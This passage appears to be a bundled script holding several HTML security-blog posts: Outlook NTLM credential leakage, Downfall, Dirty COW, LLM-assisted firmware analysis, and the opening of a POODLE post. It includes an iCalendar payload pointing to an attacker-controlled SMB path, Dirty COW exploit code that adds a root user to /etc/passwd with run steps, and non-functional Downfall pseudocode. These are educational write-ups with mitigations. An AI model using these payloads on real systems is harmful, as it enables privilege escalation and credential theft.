class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,lg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,cg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,ug=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,dg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
